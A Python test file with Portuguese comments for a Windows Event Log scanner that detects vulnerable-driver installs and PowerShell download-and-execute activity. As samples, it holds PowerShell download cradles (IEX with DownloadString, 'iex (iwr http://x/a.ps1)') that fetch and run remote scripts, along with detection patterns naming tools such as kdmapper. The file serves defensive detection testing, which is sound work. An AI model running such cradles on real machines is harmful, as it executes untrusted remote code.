"""
Testes do scanner de Event Log de execução (scan_windows_events — 7045/4104).

Prova:
  - Parser de XML do wevtutil extrai os <Data Name=...> e o TimeCreated.
  - Classificadores puros: 7045 de BYOVD casa por nome EXATO (não FP com
    substring tipo 'asio'); executor por keyword; serviço em pasta de usuário.
    4104 casa download cradle / nome de executor.
  - O scanner monta itens com a severidade certa e o matched que FUNDE com o
    scan_kernel_drivers (driver-byovd:<nome>).
  - Integração: registrado, slug event_log_exec (peso + label), script block
    cai como intent (anti_forense) no _infer_kind.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import winevent_scanner as we  # noqa: E402


_XML_7045 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><EventID>7045</EventID>'
    '<TimeCreated SystemTime="2026-06-28T18:30:45.123Z"/></System>'
    '<EventData>'
    '<Data Name="ServiceName">winring0</Data>'
    '<Data Name="ImagePath">C:\\Users\\x\\Downloads\\winring0.sys</Data>'
    '<Data Name="ServiceType">kernel mode driver</Data>'
    '</EventData></Event>'
)


# ----------------------------- parser -----------------------------

def test_parse_extracts_data_and_time():
    evs = we._parse_events(_XML_7045)
    assert len(evs) == 1
    e = evs[0]
    assert e["ServiceName"] == "winring0"
    assert "winring0.sys" in e["ImagePath"]
    assert e["_time"].startswith("2026-06-28T18:30:45")


def test_parse_ignores_garbage():
    assert we._parse_events("lixo sem evento") == []


# ----------------------------- 7045 puro -----------------------------

def test_byovd_exact_name_high():
    res = we._classify_service_install("winring0", r"C:\X\winring0.sys")
    assert res is not None
    sev, matched, _ = res
    assert sev == "high"
    assert matched == "driver-byovd:winring0"  # FUNDE com scan_kernel_drivers


def test_byovd_no_substring_false_positive():
    """'asio' está na lista; um 'realtekasio' NÃO pode casar (nome exato)."""
    assert we._classify_service_install("realtekasio", r"C:\X\realtekasio.sys") is None


def test_service_executor_keyword_high():
    res = we._classify_service_install("kdmapper", r"C:\X\kdmapper.exe")
    assert res and res[0] == "high"
    assert res[1] == "kdmapper"  # bare kw -> cluster com o executor


def test_kernel_driver_user_path_medium():
    """Driver KERNEL de pasta de usuário = MEDIUM (padrão de BYOVD-dropper)."""
    res = we._classify_service_install(
        "MyDrv", r"C:\Users\x\AppData\Local\Temp\drv.sys", "kernel mode driver")
    assert res and res[0] == "medium" and res[1] == "svc-install-userpath-driver"


def test_usermode_service_user_path_clean():
    """Serviço USERMODE de %AppData% (updater legítimo etc.) NÃO flagga — só
    driver kernel-mode. Evita FP barulhento."""
    res = we._classify_service_install(
        "MyUpdater", r"C:\Users\x\AppData\Local\App\updater.exe", "user mode service")
    assert res is None


def test_service_legit_system_clean():
    assert we._classify_service_install(
        "Spooler", r"C:\Windows\System32\spoolsv.exe", "user mode service") is None


# ----------------------------- 4104 puro -----------------------------

def test_scriptblock_download_cradle_high():
    """Baixar E executar (iex) na mesma linha = cradle clássico -> HIGH."""
    res = we._classify_scriptblock("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')")
    assert res and res[0] == "high"
    assert res[1] == "ps-scriptblock:download+iex"


def test_scriptblock_executor_name_high():
    res = we._classify_scriptblock("Start-Process solara.exe")
    assert res and res[0] == "high"
    assert res[1] == "solara"


def test_scriptblock_bare_download_clean():
    """Download PURO (iwr/Invoke-WebRequest sem iex) é uso legítimo comum de
    PowerShell — NÃO flagga. Era um FP forte antes do hardening."""
    assert we._classify_scriptblock(
        "Invoke-WebRequest -OutFile update.zip https://contoso.com/update.zip") is None
    assert we._classify_scriptblock("iwr https://x/file.txt -o file.txt") is None


def test_scriptblock_benign_clean():
    assert we._classify_scriptblock("Get-ChildItem | Sort-Object Name") is None


# ----------------------------- scanner (mockado) -----------------------------

def _patch(monkeypatch, system=None, ps=None):
    def fake_query(channel, event_id, count=300):
        if event_id == 7045:
            return system
        if event_id == 4104:
            return ps
        return None
    monkeypatch.setattr(we, "_query_events", fake_query)


def test_scanner_flags_byovd_7045(monkeypatch):
    _patch(monkeypatch, system=[{
        "ServiceName": "mhyprot2", "ImagePath": r"C:\X\mhyprot2.sys",
        "_time": "2026-06-28T10:00:00Z"}], ps=[])
    r = we.scan_windows_events()
    assert r["status"] == "suspicious"
    it = r["items"][0]
    assert it["severity"] == "high"
    assert it["matched"] == "driver-byovd:mhyprot2"


def test_scanner_dedups_repeated_service_install(monkeypatch):
    """Mesmo driver reinstalado N vezes (N eventos 7045) -> 1 item só."""
    ev = {"ServiceName": "winring0", "ImagePath": r"C:\X\winring0.sys",
          "_time": "2026-06-28T10:00:00Z"}
    _patch(monkeypatch, system=[ev, ev, ev, ev, ev], ps=[])
    r = we.scan_windows_events()
    assert len(r["items"]) == 1
    assert r["items"][0]["matched"] == "driver-byovd:winring0"


def test_scanner_keeps_distinct_userpath_services(monkeypatch):
    """Dois DRIVERS kernel diferentes em pasta de usuário (mesmo matched genérico)
    NÃO podem colapsar num só."""
    _patch(monkeypatch, system=[
        {"ServiceName": "DrvA", "ImagePath": r"C:\Users\x\Temp\a.sys",
         "ServiceType": "kernel mode driver", "_time": ""},
        {"ServiceName": "DrvB", "ImagePath": r"C:\Users\x\Temp\b.sys",
         "ServiceType": "kernel mode driver", "_time": ""},
    ], ps=[])
    r = we.scan_windows_events()
    assert len(r["items"]) == 2


def test_scanner_dedups_multipart_scriptblock(monkeypatch):
    """Script multi-parte gera vários 4104 com o mesmo matched — só 1 item."""
    blob = {"ScriptBlockText": "iex (iwr http://x/a.ps1)", "_time": "2026-06-28T10:00:00Z"}
    _patch(monkeypatch, system=[], ps=[blob, blob, blob])
    r = we.scan_windows_events()
    assert len([i for i in r["items"] if i["matched"].startswith("ps-scriptblock")]) == 1


def test_scanner_clean_when_nothing_matches(monkeypatch):
    _patch(monkeypatch,
           system=[{"ServiceName": "Spooler", "ImagePath": r"C:\Windows\System32\spoolsv.exe", "_time": ""}],
           ps=[{"ScriptBlockText": "Get-Process", "_time": ""}])
    assert we.scan_windows_events()["status"] == "clean"


def test_scanner_error_when_no_access(monkeypatch):
    """Sem acesso a NENHUM log (ambos None) -> erro, não 'clean'."""
    _patch(monkeypatch, system=None, ps=None)
    assert we.scan_windows_events()["status"] == "error"


# ----------------------------- integração -----------------------------

def test_registered_in_scanner_list():
    assert we.scan_windows_events in we.ALL_WINEVENT_SCANNERS


def test_slug_weight_and_label():
    import evidence as ev
    import report_assets
    assert ev._source_slug_from_name("Event Log de execução (7045/4104)") == "event_log_exec"
    assert "event_log_exec" in ev.SOURCE_WEIGHTS
    assert "event_log_exec" in report_assets.SOURCE_LABELS


def test_scriptblock_categorized_as_intent():
    """matched ps-scriptblock: deve cair como anti_forense (intent), não executor."""
    import evidence as ev
    assert ev._infer_kind("PowerShell script block", "ps-scriptblock:iwr") == "anti_forense"


def test_byovd_event_merges_with_kernel_driver():
    """7045 de winring0 e o scan_kernel_drivers usam o MESMO matched -> mesmo
    kind byovd (fundem no cluster)."""
    import evidence as ev
    assert ev._infer_kind("Serviço/driver instalado: winring0.sys",
                          "driver-byovd:winring0") == "byovd"
